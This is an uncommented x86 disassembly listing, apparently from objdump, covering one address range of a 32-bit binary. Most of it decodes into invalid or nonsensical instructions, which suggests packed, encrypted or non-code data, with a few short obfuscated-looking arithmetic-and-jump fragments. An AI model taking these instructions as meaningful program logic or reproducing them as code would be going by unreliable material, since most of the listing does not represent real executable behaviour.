  40d0da:	imul   ecx,DWORD PTR [esi+ebp*1+0x63ccacee],0x76
  40d0e2:	push   esi
  40d0e3:	test   DWORD PTR [ebx-0x4a],edi
  40d0e6:	inc    ebp
  40d0e7:	mov    ecx,0xe9477871
  40d0ec:	mov    bh,0x1f
  40d0ee:	std    
  40d0ef:	cmp    BYTE PTR [esi-0x2b],bh
  40d0f2:	xchg   esi,eax
  40d0f3:	call   0xcbc2:0xd1ae789e
  40d0fa:	sbb    bh,BYTE PTR [edx]
  40d0fc:	mov    al,ds:0x9c9e04f0
  40d101:	add    eax,0xfc88ad39
  40d106:	dec    edi
  40d107:	je     0x40d0f3
  40d109:	and    ebp,DWORD PTR [ecx-0x2e8eb36f]
  40d10f:	add    ch,dh
  40d111:	cmp    BYTE PTR [ebx],ch
  40d113:	in     eax,dx
  40d114:	cmp    al,0x78
  40d116:	(bad)  
  40d117:	sub    BYTE PTR [ecx+0x17],0x61
  40d11b:	adc    ebp,DWORD PTR [ebx+0x53cdad0c]
  40d121:	cwde   
  40d122:	sub    al,0xbb
  40d124:	cld    
  40d125:	in     eax,0x6e
  40d127:	dec    esp
  40d128:	add    eax,0x94d7a8c3
  40d12d:	mov    WORD PTR [edx-0x7c],fs
  40d130:	out    dx,al
  40d131:	sbb    BYTE PTR [edx],al
  40d133:	and    al,0x2b
  40d135:	xor    BYTE PTR [edx+0x75],cl
  40d138:	dec    edi
  40d139:	je     0x40d138
  40d13b:	xchg   esp,eax
  40d13c:	test   DWORD PTR [ebx-0xf82a556],eax
  40d142:	and    DWORD PTR [edx+ebx*8-0x599c1184],ecx
  40d149:	add    eax,0x8bf62b3c
  40d14e:	push   esi
  40d14f:	and    eax,DWORD PTR [esi+0x64]
  40d152:	neg    BYTE PTR [bx+di-0x28]
  40d156:	cmp    ebx,esp
  40d158:	xlat   BYTE PTR ds:[ebx]
  40d159:	xor    al,BYTE PTR [ebx-0x50c8fe11]
  40d15f:	push   ss
  40d160:	or     DWORD PTR [edx-0x53c5729c],esi
  40d166:	mov    DWORD PTR [edx+0x57],ebp
  40d169:	rcr    BYTE PTR [esi+0x6432c08],1
  40d16f:	inc    esi
  40d170:	mov    al,0x93
  40d172:	mov    ch,0x70
  40d174:	es add al,0x46
  40d177:	push   0x4e33b628
  40d17c:	fistp  WORD PTR [esi+ebx*1+0x5a]
  40d180:	sbb    DWORD PTR [ebp-0x76],0xcad6ced9
  40d187:	xor    DWORD PTR [edx],edx
  40d189:	ds inc esp
  40d18b:	test   ch,bl
  40d18d:	clc    
  40d18e:	ret    0xc617
  40d191:	push   ss
  40d192:	fst    st(1)
  40d194:	mov    BYTE PTR [esp+ebx*1-0x2ad55799],bl
  40d19b:	fstp   DWORD PTR [eax+0x212ccbd3]
  40d1a1:	jo     0x40d1e8
  40d1a3:	xchg   BYTE PTR [edi+0x31a75992],cl
  40d1a9:	mov    esi,0xb3e7764
  40d1ae:	xchg   DWORD PTR [ecx+0x620de5fc],ebp
  40d1b4:	cmp    bl,bl
  40d1b6:	add    DWORD PTR [edx+eax*8],ecx
  40d1b9:	mov    es:0x3de4376,al
  40d1bf:	adc    ebx,DWORD PTR [ecx-0x3435deee]
  40d1c5:	mov    al,ds:0x58229911
  40d1ca:	js     0x3c7400fa
  40d1d0:	ins    DWORD PTR es:[edi],dx
  40d1d1:	rcr    eax,0x27
  40d1d4:	mov    edx,0x55525877
  40d1d9:	and    BYTE PTR ds:0xb418c012,0x33
  40d1e0:	rol    BYTE PTR [ebx],1
  40d1e2:	ror    DWORD PTR [edi],1
  40d1e4:	scas   eax,DWORD PTR es:[edi]
  40d1e5:	xlat   BYTE PTR ds:[ebx]
  40d1e6:	mov    edi,DWORD PTR [ebp-0xc]
  40d1e9:	xor    edi,eax
  40d1eb:	sub    edx,edi
  40d1ed:	mov    edi,DWORD PTR [ebp-0xc]
  40d1f0:	mov    ebx,DWORD PTR [ebp-0x14]
  40d1f3:	xor    edi,eax
  40d1f5:	add    edi,ecx
  40d1f7:	imul   edi,ebx
  40d1fa:	mov    ebx,DWORD PTR [ebp-0x18]
  40d1fd:	jmp    0x40d614
  40d202:	pop    esi
  40d203:	in     al,0x48
  40d205:	add    BYTE PTR [esp+edi*4+0x76],dl
  40d209:	ins    BYTE PTR es:[edi],dx
  40d20a:	xor    edx,DWORD PTR [ecx]
  40d20c:	fcmovb st,st(2)
  40d20e:	xchg   ecx,eax
  40d20f:	adc    eax,DWORD PTR [ecx+eiz*1-0x3a]
  40d213:	call   0x7e7e:0x79707e7e
  40d21a:	sub    ah,BYTE PTR [edx-0x5]
  40d21d:	sub    al,bh
  40d21f:	in     al,0x9f
  40d221:	inc    esp
  40d222:	add    ebx,edi
  40d224:	sbb    eax,0xa0eae313
  40d229:	pop    ecx
  40d22a:	push   cs
  40d22b:	sahf   
  40d22c:	in     al,dx
  40d22d:	fistp  WORD PTR [edi]
  40d22f:	jae    0x40d282
  40d231:	add    eax,0x844a286f
  40d236:	push   esp
  40d237:	mov    BYTE PTR [ebx+0x51],ah
  40d23a:	bound  ebp,QWORD PTR [ebp+edx*4-0x5a85b939]
  40d241:	mov    dl,0xa0
  40d243:	mov    bl,0x6b
  40d245:	out    dx,al
  40d246:	jp     0x40d1d3
  40d248:	xlat   BYTE PTR ds:[ebx]
  40d249:	icebp  
  40d24a:	rcr    DWORD PTR [eax],cl
  40d24c:	das    
  40d24d:	cld    
  40d24e:	or     ebp,eax
  40d250:	dec    esi
  40d251:	(bad)  
  40d252:	pop    edi
  40d253:	push   ss
  40d254:	jo     0x40d29c
  40d256:	pop    ds
  40d257:	inc    esi
  40d258:	inc    edx
  40d259:	and    eax,0x8001f966
  40d25e:	pop    edx
  40d25f:	sub    eax,0x2828829c
  40d264:	sbb    al,0x82
  40d266:	repz jle 0x40d22f
  40d269:	dec    edi
  40d26a:	sbb    eax,0x7c65f7f
  40d26f:	and    DWORD PTR [ebp+0x73c35085],ecx
  40d275:	and    eax,DWORD PTR [edi]
  40d277:	dec    edi
  40d278:	add    DWORD PTR [edx],ebp
  40d27a:	test   ch,dh
  40d27c:	xchg   ecx,eax
  40d27d:	rol    BYTE PTR [edx-0x6fe7f285],cl
  40d283:	jo     0x40d27f
  40d285:	xor    al,0x77
  40d287:	xchg   edi,eax
  40d288:	cmp    al,0x46
  40d28a:	xchg   ebx,eax
  40d28c:	push   es
  40d28d:	jae    0x40d227
  40d28f:	bound  eax,QWORD PTR [eax]
  40d291:	(bad)  
  40d292:	cmp    edx,DWORD PTR [edi+0x2f]
  40d295:	test   ecx,edx
  40d297:	adc    eax,0x3f1bdfb5
  40d29c:	(bad)  
  40d29d:	mov    ebp,0x4c3bf913
  40d2a2:	adc    ch,BYTE PTR [ecx]
  40d2a4:	aad    0xae
  40d2a6:	test   DWORD PTR [edx-0x69],esp
  40d2a9:	mov    dh,0x63
  40d2ab:	test   DWORD PTR [eax-0x41],edi
  40d2ae:	mov    edi,0x7e91b0ff
  40d2b3:	xchg   BYTE PTR ds:0x748ce98b,dh
  40d2b9:	retf   0x8d06
  40d2bc:	push   esp
  40d2bd:	jne    0x40d287
  40d2bf:	int3   
  40d2c0:	sbb    eax,0xa8ea3f01
  40d2c5:	xchg   edi,eax
  40d2c6:	ret    
  40d2c7:	bound  eax,QWORD PTR [edx+0x7ab60644]
  40d2cd:	sti    
  40d2ce:	adc    al,0x52
  40d2d0:	fcmovu st,st(0)
  40d2d2:	out    0x8b,eax
  40d2d4:	push   ds
  40d2d5:	aaa    
  40d2d6:	xlat   BYTE PTR ds:[ebx]
  40d2d7:	xchg   edx,eax
  40d2d8:	imul   edi,DWORD PTR [edx],0xa1c9879f
  40d2de:	xchg   ebx,eax
  40d2df:	loop   0x40d32e
  40d2e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2e2:	push   edx
  40d2e3:	pusha  
  40d2e4:	not    bh
  40d2e6:	sbb    bh,BYTE PTR [ebx]
  40d2e8:	cmp    BYTE PTR [edx],ah
  40d2ea:	popa   
  40d2eb:	es add al,0xc0
  40d2ee:	push   edx
  40d2ef:	test   BYTE PTR [edx-0x6b5a09b2],cl
  40d2f5:	jo     0x40d31f
  40d2f7:	outs   dx,BYTE PTR ds:[esi]
  40d2f8:	out    dx,al
  40d2f9:	cld    
  40d2fa:	push   esi
  40d2fb:	lods   al,BYTE PTR ds:[esi]
  40d2fc:	mov    WORD PTR [ebp+0x14],es
  40d2ff:	add    BYTE PTR [ebx],bl
  40d301:	test   eax,0x36e3ad21
  40d306:	inc    ebp
  40d307:	out    dx,al
  40d308:	or     al,0xdc
  40d30a:	fmul   DWORD PTR [edi+0x58]
  40d30d:	or     al,0x11
  40d30f:	push   cs
  40d310:	push   0xecef05ef
  40d315:	pop    edx
  40d316:	mov    WORD PTR [esi],gs
  40d318:	push   esi
  40d319:	shl    BYTE PTR [esp+eax*1],1
  40d31c:	pop    edi
  40d31d:	es inc edi
  40d31f:	lods   eax,DWORD PTR ds:[esi]
  40d320:	xor    DWORD PTR [ecx-0x8],eax
  40d323:	fmul   DWORD PTR ds:0xd6478a7b
  40d329:	std    
  40d32a:	sbb    al,0x2c
  40d32c:	cwde   
  40d32d:	pushf  
  40d32e:	cvtps2pd xmm2,QWORD PTR [ebp+0x75e79a03]
  40d335:	adc    DWORD PTR [ecx-0x6f],eax
  40d338:	test   al,0xe2
  40d33a:	test   BYTE PTR [edi],0xe0
  40d33d:	js     0x40d37d
  40d33f:	icebp  
  40d340:	dec    esp
  40d341:	xchg   edi,eax
  40d342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d343:	fisubr DWORD PTR [esi+0x9]
  40d346:	or     edi,DWORD PTR [esi-0x5b735ce8]
  40d34c:	inc    ebx
  40d34d:	ds in  al,0x4d
  40d350:	js     0x40d34b
  40d352:	daa    
  40d353:	or     dl,BYTE PTR [edx+0x69]
  40d356:	sub    BYTE PTR [ecx-0x747a40ae],al
  40d35c:	fsubr  DWORD PTR [ebp+0x35]
  40d35f:	or     dl,BYTE PTR [eax]
  40d361:	mov    al,0x20
  40d363:	mov    bh,0xd
  40d365:	mov    ebp,0x1ba3f520
  40d36a:	sbb    eax,0x18c9d7aa
  40d36f:	daa    
  40d370:	mov    bh,BYTE PTR [ebp-0x108badce]
  40d376:	inc    edi
  40d377:	pop    ds
  40d378:	xchg   ecx,eax
  40d379:	and    al,0xa3
  40d37b:	xchg   DWORD PTR [ecx-0x28],esi
  40d37e:	(bad)  
  40d37f:	xor    BYTE PTR ds:0x71529353,cl
  40d385:	fisttp DWORD PTR [eax]
  40d387:	icebp  
  40d388:	loopne 0x40d34e
  40d38a:	je     0x40d3f6
  40d38c:	pop    ss
  40d38d:	mov    WORD PTR [ebx-0x6e099900],cs
  40d393:	lea    edx,[edx-0x26]
  40d396:	adc    cl,BYTE PTR [edx-0x649c17a]
  40d39c:	inc    ebp
  40d39d:	(bad)  
  40d39e:	imul   edi,DWORD PTR [ebx],0xb91ba841
  40d3a4:	daa    
  40d3a5:	in     eax,dx
  40d3a6:	xlat   BYTE PTR ds:[ebx]
  40d3a7:	popa   
  40d3a8:	mov    cl,0xbe
  40d3aa:	inc    eax
  40d3ab:	pop    ebx
  40d3ac:	pop    ebp
  40d3ad:	jp     0x40d331
  40d3af:	add    dl,cl
  40d3b1:	mov    dl,BYTE PTR [ebx+0x49595237]
  40d3b7:	dec    esi
  40d3b8:	jno    0x40d429
  40d3ba:	repz push edx
  40d3bc:	(bad)  
  40d3be:	xor    ebx,DWORD PTR [ecx+esi*2-0x20abb91d]
  40d3c5:	or     al,0x34
  40d3c7:	(bad)  
  40d3c9:	aaa    
  40d3ca:	adc    al,0x98
  40d3cc:	add    BYTE PTR [ecx-0x670dfa0],al
  40d3d2:	mov    dl,0x4a
  40d3d4:	or     ebp,ecx
  40d3d6:	(bad)  
  40d3d8:	inc    edx
  40d3d9:	outs   dx,DWORD PTR ds:[esi]
  40d3da:	lahf   
  40d3db:	shl    BYTE PTR [ebx+0x75],0xf2
  40d3df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3e0:	adc    BYTE PTR [edi+0x70],ah
  40d3e3:	pop    edi
  40d3e4:	call   0x2e0db20a
  40d3e9:	mov    ds:0x8eacc7a2,eax
  40d3ee:	mov    ch,0xf6
  40d3f0:	dec    ecx
  40d3f1:	and    edx,esi
  40d3f3:	jnp    0x40d3c4
  40d3f5:	inc    edx
  40d3f6:	xchg   edi,eax
  40d3f7:	push   ds
  40d3f8:	push   ecx
  40d3f9:	mul    ebx
  40d3fb:	sub    eax,0x61fecb5e
  40d400:	std    
  40d401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d402:	or     ecx,DWORD PTR [edx]
  40d404:	in     eax,dx
  40d405:	jae    0x40d480
  40d407:	jle    0x40d440
  40d409:	mov    edi,0xafe33db8
  40d40e:	pop    eax
  40d40f:	scas   eax,DWORD PTR es:[edi]
  40d410:	pushf  
  40d411:	sbb    al,BYTE PTR [eax]
  40d413:	mov    ah,ch
  40d415:	pushf  
  40d416:	out    0x58,eax
  40d418:	fdivr  QWORD PTR [ecx]
  40d41a:	cmp    BYTE PTR [ebx],0xe3
  40d41d:	cmp    eax,0x5beb7b62
  40d422:	inc    eax
  40d423:	outs   dx,BYTE PTR ds:[esi]
  40d424:	iret   
  40d425:	xlat   BYTE PTR ds:[ebx]
  40d426:	(bad)  
  40d427:	leave  
  40d428:	jns    0x40d3e5
  40d42a:	out    0x16,al
  40d42c:	jo     0x40d4a9
  40d42e:	mov    edi,0x82351e4a
  40d433:	call   0xf34941ee
  40d438:	mov    cl,0xb5
  40d43a:	lods   al,BYTE PTR ds:[esi]
  40d43b:	and    DWORD PTR [edx],edx
  40d43d:	push   es
  40d43e:	sbb    ch,BYTE PTR [edi+0x313d930e]
  40d444:	mov    ds:0x2bba7023,al
  40d449:	sahf   
  40d44a:	pop    ds
  40d44b:	dec    ebx
  40d44c:	sbb    BYTE PTR [edx+0x1875746c],dh
  40d452:	cld    
  40d453:	hlt    
  40d454:	in     eax,0x84
  40d456:	add    DWORD PTR [ebp+0x4be0483c],0xffffff81
  40d45d:	pop    edi
  40d45e:	(bad)  
  40d45f:	pop    eax
  40d460:	into   
  40d461:	adc    DWORD PTR [ecx],0x98f5cfde
  40d467:	xor    esi,esp
  40d469:	scas   eax,DWORD PTR es:[edi]
  40d46a:	mov    ds:0x3b9620fe,al
  40d46f:	lods   al,BYTE PTR ds:[esi]
  40d470:	or     BYTE PTR [eax],bl
  40d472:	jbe    0x40d4ad
  40d474:	cmp    al,BYTE PTR [ecx]
  40d476:	lea    ebp,[edi]
  40d478:	jb     0x40d46f
  40d47a:	inc    edx
  40d47b:	mov    cl,0xc8
  40d47d:	xchg   esi,eax
  40d47e:	push   0x50
  40d480:	jp     0x40d464
  40d482:	sub    al,dh
  40d484:	and    esi,DWORD PTR [edi]
  40d486:	pop    ds
  40d487:	stos   DWORD PTR es:[edi],eax
  40d488:	mov    edx,0x7a4cea3c
  40d48d:	loop   0x40d4d3
  40d48f:	sub    al,0x13
  40d491:	jmp    0x82eb:0xc0b4
  40d497:	xor    BYTE PTR [edi-0x678f2fe7],bl
  40d49d:	xor    dl,BYTE PTR [esi-0xc]
  40d4a0:	adc    BYTE PTR [ecx+0x50],ch
  40d4a3:	xchg   dl,dl
  40d4a5:	or     DWORD PTR [eax+0x56],ebx
  40d4a8:	call   FWORD PTR [ebp+edi*2+0x329fdbee]
  40d4af:	inc    edx
  40d4b0:	push   0xaeccd5a4
  40d4b5:	lahf   
  40d4b6:	or     al,0x4b
  40d4b8:	outs   dx,BYTE PTR ds:[esi]
  40d4b9:	pop    ds
  40d4ba:	pop    es
  40d4bb:	add    eax,0x6dffc962
  40d4c0:	and    al,dl
  40d4c2:	out    dx,al
  40d4c3:	jmp    0x9c8255df
  40d4c8:	stos   DWORD PTR es:[edi],eax
  40d4c9:	iret   
  40d4ca:	loope  0x40d456
  40d4cc:	std    
  40d4cd:	push   eax
  40d4ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4cf:	imul   ebp,DWORD PTR [esi+0x245f1b00],0xd
  40d4d6:	in     eax,0x31
  40d4d8:	test   ch,dl
  40d4da:	xchg   ecx,eax
  40d4db:	or     bh,BYTE PTR [ebp-0x587657d2]
  40d4e1:	fsubp  st(6),st
  40d4e3:	push   ebp
  40d4e4:	sbb    bl,dl
  40d4e6:	das    
  40d4e7:	popa   
  40d4e8:	add    BYTE PTR [esi+0x1],cl
  40d4eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4ec:	gs clc 
  40d4ee:	adc    eax,0xcc0ef107
  40d4f3:	fiadd  DWORD PTR [edi]
  40d4f5:	jg     0x40d4ec
  40d4f7:	mov    ebx,0xd0c208b8
  40d4fc:	dec    edi
  40d4fd:	(bad)  
  40d4ff:	rcr    cl,cl
  40d501:	mov    ?,WORD PTR [eax+edi*1-0x3]
  40d505:	mov    edi,0xb76aef4e
  40d50a:	in     al,0x10
  40d50c:	xchg   esp,eax
  40d50d:	sbb    al,0x2d
  40d50f:	in     eax,0x54
  40d511:	jg     0x40d587
  40d513:	cmp    edi,DWORD PTR [edx+0x1f882861]
  40d519:	add    eax,0x4cfe6d29
  40d51e:	fmulp  st(1),st
  40d520:	mov    ch,0x8f
  40d522:	mov    DWORD PTR ds:0xc4f990c6,0x984e2b64
  40d52c:	test   BYTE PTR [edi+0x44d343f4],0xdb
  40d533:	add    ch,ch
  40d535:	out    dx,al
  40d536:	das    
  40d537:	(bad)  
  40d538:	xchg   ebp,eax
  40d539:	arpl   WORD PTR [eax],si
  40d53b:	mov    ebx,0x7a7bafd4
  40d540:	pop    ecx
  40d541:	adc    DWORD PTR [esi-0xa84d782],ecx
  40d547:	or     bh,dl
  40d549:	es or  al,0xed
  40d54c:	loope  0x40d4ff
  40d54e:	mov    al,0xf3
  40d550:	xor    DWORD PTR [ebx],edi
  40d552:	xchg   ebx,eax
  40d553:	add    ebx,ebp
  40d555:	pop    esp
  40d556:	(bad)  
  40d557:	stc    
  40d558:	popa   
  40d559:	pushf  
  40d55a:	cmp    DWORD PTR [eax-0x7],ebx
  40d55d:	test   DWORD PTR [ecx],ebx
  40d55f:	mov    eax,0x34e7cc48
  40d564:	mov    al,ds:0xb83be907
  40d569:	cli    
  40d56a:	or     BYTE PTR [edx+0x59],dl
  40d56d:	push   es
  40d56e:	push   cs
  40d56f:	sub    eax,DWORD PTR [edi+esi*8+0x1e59eab7]
  40d576:	mov    bl,0x6
  40d578:	inc    ecx
  40d579:	cmp    BYTE PTR [ecx+0x71b1ce44],0x49
  40d580:	repz test DWORD PTR [edx+0x2b],0xf47d8a59
  40d588:	stos   DWORD PTR es:[edi],eax
  40d589:	aas    
  40d58a:	fnsave [edx]
  40d58c:	adc    al,0xe2
  40d58e:	xor    dl,BYTE PTR [edi]
  40d590:	loope  0x40d5ed
  40d592:	mov    ah,0xb6
  40d594:	cli    
  40d595:	out    0xae,eax
  40d597:	mov    esp,0x8deace42
  40d59c:	inc    esp
  40d59d:	imul   ebx,DWORD PTR [esp+ebx*4+0x70],0xf1ac7df9
  40d5a5:	push   edi
  40d5a6:	in     al,0x64
  40d5a8:	xor    BYTE PTR [esi+0x5c],cl
  40d5ab:	xchg   esp,eax
  40d5ac:	(bad)  
  40d5ad:	adc    DWORD PTR [ecx+0x6b],ebx
  40d5b0:	fucom  st(5)
  40d5b2:	into   
  40d5b3:	push   ss
  40d5b4:	cmp    al,0x5c
  40d5b6:	clc    
  40d5b7:	(bad)  
  40d5b8:	mov    gs,WORD PTR [ebx-0x63738e94]
  40d5be:	jmp    0x29aac43
  40d5c3:	xchg   ecx,eax
  40d5c4:	mov    esi,0x235684a4
  40d5c9:	pop    edi
  40d5ca:	sbb    al,0xfe
  40d5cc:	cs lahf 
  40d5ce:	mov    dl,0x53
  40d5d0:	sub    BYTE PTR [edx],ah
  40d5d2:	std    
  40d5d3:	jp     0x40d556
  40d5d5:	jb     0x40d591
  40d5d7:	gs out 0xdd,al
  40d5da:	mov    cl,0x77
  40d5dc:	lahf   
  40d5dd:	je     0x40d65e
  40d5df:	inc    esp
  40d5e0:	hlt    
  40d5e1:	xor    DWORD PTR [edi],esp
  40d5e3:	add    al,0x30
  40d5e5:	sbb    al,BYTE PTR [eax]
  40d5e7:	test   ch,dh
  40d5e9:	std    
  40d5ea:	in     eax,0x2c
  40d5ec:	retf   0xd3a5
  40d5ef:	xor    DWORD PTR [esi],esi
  40d5f1:	mov    DWORD PTR [esi],esp
  40d5f3:	mov    edx,0xe7378907
  40d5f8:	inc    esp
  40d5f9:	ja     0x40d58a
  40d5fb:	popf   
  40d5fc:	out    0xaa,eax
  40d5fe:	jb     0x40d61e
  40d600:	fld    TBYTE PTR [ebp+ecx*2+0x60cadb00]
  40d607:	cld    
  40d608:	jno    0x40d5c1
  40d60a:	mov    eax,ds:0x677cc927
  40d60f:	xchg   BYTE PTR [edx],dl
  40d611:	inc    ecx
  40d612:	in     eax,dx
  40d613:	(bad)  [ebx]
  40d615:	fsubr  DWORD PTR [ebx]
  40d617:	ror    DWORD PTR [ebp+0x72991fbc],1
  40d61d:	xor    al,BYTE PTR [eax]
  40d61f:	cmp    edi,edx
  40d621:	jbe    0x40c529
  40d627:	mov    edx,DWORD PTR [ebp-0xc]
  40d62a:	mov    edi,DWORD PTR [ebp-0x24]
  40d62d:	xor    edx,eax
  40d62f:	add    edx,ecx
  40d631:	imul   edx,edi
  40d634:	mov    edi,DWORD PTR [ebp-0x18]
  40d637:	jmp    0x40da4e
  40d63c:	(bad)  
  40d63d:	pusha  
  40d63e:	jecxz  0x40d614
  40d640:	jge    0x40d697
  40d642:	icebp  
  40d643:	ins    BYTE PTR es:[edi],dx
  40d644:	(bad)  
  40d645:	fwait
  40d646:	mov    edi,0x8ee52c98
  40d64b:	adc    edi,DWORD PTR [eax]
  40d64d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d64e:	jle    0x40d6ce
  40d650:	jo     0x40d6cb
  40d652:	jle    0x40d6d2
  40d654:	sub    bh,dh
  40d656:	mov    BYTE PTR [ecx-0x637921e],dh
  40d65c:	push   edi
  40d65d:	inc    ebx
  40d65e:	icebp  
  40d65f:	pop    eax
  40d660:	push   edx
  40d661:	mov    eax,DWORD PTR [ebx-0x25]
  40d664:	mov    DWORD PTR [ecx+0x7a],eax
  40d667:	jb     0x40d636
  40d669:	sbb    ah,BYTE PTR [ebp+ebx*8+0x27]
  40d66d:	out    dx,eax
  40d66e:	adc    edx,DWORD PTR [ebx-0x2639b9ba]
  40d674:	dec    esp
  40d675:	xchg   edi,eax
  40d676:	pop    eax
  40d677:	inc    ecx
  40d678:	xlat   BYTE PTR ds:[ebx]
  40d679:	cli    
  40d67a:	arpl   WORD PTR [edx-0x22],bx
  40d67d:	retf   
  40d67e:	push   ebx
  40d67f:	cmc    
  40d680:	or     dh,BYTE PTR [edi-0x2f25b292]
  40d686:	add    eax,0xf52c460b
  40d68b:	pusha  
  40d68c:	and    ebx,DWORD PTR [eax+ebx*8]
  40d68f:	xchg   esi,eax
  40d690:	adc    ebx,DWORD PTR [esi]
  40d692:	(bad)  
  40d693:	iret   
  40d694:	dec    ebp
  40d695:	cmp    ecx,edx
  40d697:	mov    al,0x7f
  40d699:	pop    ss
  40d69a:	test   DWORD PTR [eax-0x4c0c4663],edi
  40d6a0:	out    dx,eax
  40d6a1:	fild   WORD PTR [esi+0x3c087fb1]
  40d6a7:	gs jmp 0x6dfa:0x4bd18199
  40d6af:	and    eax,0xe6b104b8
  40d6b4:	or     DWORD PTR [ecx],edi
  40d6b6:	mov    dh,0x4a
  40d6b8:	in     al,dx
  40d6b9:	jbe    0x40d705
  40d6bb:	inc    edx
  40d6bc:	rol    bl,cl
  40d6be:	neg    BYTE PTR [ecx-0x5c07060c]
  40d6c4:	(bad)  
  40d6c6:	inc    ebx
  40d6c7:	cdq    
  40d6c8:	call   0xadb1:0xc2c9032c
  40d6cf:	pop    ebp
  40d6d0:	jl     0x40d6fb
  40d6d2:	jb     0x40d662
  40d6d4:	cmp    eax,0xe5122415
  40d6d9:	cmp    DWORD PTR ds:0xcb8b323d,esp
  40d6df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6e0:	call   0x65c3:0xd3832dc9
  40d6e7:	scas   eax,DWORD PTR es:[edi]
  40d6e8:	and    esp,DWORD PTR [eax]
  40d6ea:	sub    eax,0x7c77a55c
  40d6ef:	add    BYTE PTR [edx+0x460d425d],dh
  40d6f5:	push   ds
  40d6f6:	push   ebx
  40d6f7:	cld    
  40d6f8:	dec    esp
  40d6f9:	cmp    DWORD PTR [ebx],0xbe62122b
  40d6ff:	xor    al,0x89
  40d701:	mov    ebp,0xea5b8c18
  40d706:	push   esp
  40d707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d708:	pop    eax
  40d709:	adc    al,0xeb
  40d70b:	outs   dx,DWORD PTR ds:[esi]
  40d70c:	(bad)
  40d710:	rcr    dh,0x17
  40d713:	std    
  40d714:	push   0x2d
  40d716:	xor    BYTE PTR [ebx+0x64],0x2b
  40d71a:	mov    dh,0xee
  40d71c:	into   
  40d71d:	cdq    
  40d71e:	outs   dx,DWORD PTR ds:[esi]
  40d71f:	and    esi,esi
  40d721:	xlat   BYTE PTR gs:[ebx]
  40d723:	pop    es
  40d724:	or     BYTE PTR [edi],bl
  40d726:	add    eax,0x242bded9
  40d72b:	sub    eax,0xf3d90167
  40d730:	xor    BYTE PTR [eax],al
  40d732:	in     al,0x2
  40d734:	jns    0x40d71e
  40d736:	cmc    
  40d737:	outs   dx,BYTE PTR ds:[esi]
  40d738:	inc    ebp
  40d739:	out    dx,eax
  40d73a:	out    0x37,eax
  40d73c:	lods   al,BYTE PTR ds:[esi]
  40d73d:	stos   DWORD PTR es:[edi],eax
  40d73e:	mov    ebp,0x8b2e5b18
  40d743:	or     BYTE PTR [ebx],0xf8
  40d746:	shl    BYTE PTR [esi-0x24],1
  40d749:	pop    ebx
  40d74a:	icebp  
  40d74b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d74c:	int    0x49
  40d74e:	call   0xc6af62e5
  40d753:	mov    esi,0xccd079f2
  40d758:	sbb    ebp,DWORD PTR ds:0xe87ac0f5
  40d75e:	fwait
  40d75f:	add    al,0xd1
  40d761:	sub    BYTE PTR [ecx-0x2e],bh
  40d764:	push   cs
  40d765:	jnp    0x40d797
  40d767:	sar    BYTE PTR [edx+0x5b],1
  40d76a:	repnz shr DWORD PTR ds:[eax+0x3b],cl
  40d76f:	cmp    ecx,DWORD PTR [ecx+0x2c]
  40d772:	push   es
  40d773:	loop   0x40d707
  40d775:	pop    esi
  40d776:	mov    al,0x6c
  40d778:	lods   eax,DWORD PTR ds:[esi]
  40d779:	jns    0x40d7ea
  40d77b:	jge    0x40d7a6
  40d77d:	or     DWORD PTR [esi+0x70],0x704541e4
  40d784:	popa   
  40d785:	adc    eax,edx
  40d787:	int    0x83
  40d789:	mov    eax,ds:0x6d1c6db5
  40d78e:	retf   0xff40
  40d791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d792:	lock dec ebp
  40d794:	gs inc ecx
  40d796:	pop    ebx
  40d797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d798:	xchg   ebx,eax
  40d799:	and    BYTE PTR [esi],0xa8
  40d79c:	int3   
  40d79d:	jl     0x40d80b
  40d79f:	and    BYTE PTR [eax+ebp*2-0x5e],dl
  40d7a3:	xor    eax,0xf62b8c39
  40d7a8:	test   eax,0x56829d70
  40d7ad:	push   ebp
  40d7ae:	fiadd  DWORD PTR ds:0x1ff2e9e7
  40d7b4:	inc    ebp
  40d7b5:	pushf  
  40d7b6:	and    BYTE PTR [ebp+0x3b],0x82
  40d7ba:	test   BYTE PTR [eax+ecx*1+0x3ae12204],0x58
  40d7c2:	mov    esp,0xd91ba146
  40d7c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7c8:	ret    0xa9bf
  40d7cb:	pop    ecx
  40d7cc:	out    dx,ax
  40d7ce:	mov    DWORD PTR [ecx],eax
  40d7d0:	dec    edi
  40d7d1:	mov    ebx,0xb041b944
  40d7d6:	xchg   ebp,eax
  40d7d7:	add    BYTE PTR [edx-0x411b8c8c],bh
  40d7dd:	aas    
  40d7de:	pop    edx
  40d7df:	sbb    DWORD PTR [edi],esi
  40d7e1:	test   al,0x34
  40d7e3:	jle    0x40d767
  40d7e5:	pushf  
  40d7e6:	add    ebx,ecx
  40d7e8:	scas   eax,DWORD PTR es:[edi]
  40d7e9:	test   eax,0xccce40d9
  40d7ee:	iret   
  40d7ef:	sar    ebp,cl
  40d7f1:	outs   dx,DWORD PTR ds:[esi]
  40d7f2:	pop    es
  40d7f3:	frstor [esi-0x18]
  40d7f6:	jecxz  0x40d81c
  40d7f8:	add    al,0x39
  40d7fa:	retf   
  40d7fb:	inc    edx
  40d7fc:	jg     0x40d7bb
  40d7fe:	leave  
  40d7ff:	or     bl,ch
  40d801:	dec    edx
  40d802:	dec    edi
  40d803:	or     BYTE PTR [bp-0x30],dl
  40d807:	(bad)  
  40d808:	retf   0xce9a
  40d80b:	call   FWORD PTR [ecx]
  40d80d:	adc    eax,0xc76ca526
  40d812:	mov    eax,ds:0x501565f3
  40d817:	data16 fstp QWORD PTR [edi+0x35]
  40d81b:	fldenv [edx]
  40d81d:	mov    cl,0x15
  40d81f:	pusha  
  40d820:	ret    
  40d821:	inc    esp
  40d822:	mov    ebp,es
  40d824:	fxch   st(0)
  40d826:	mov    ds,WORD PTR [ebx-0x53fb649f]
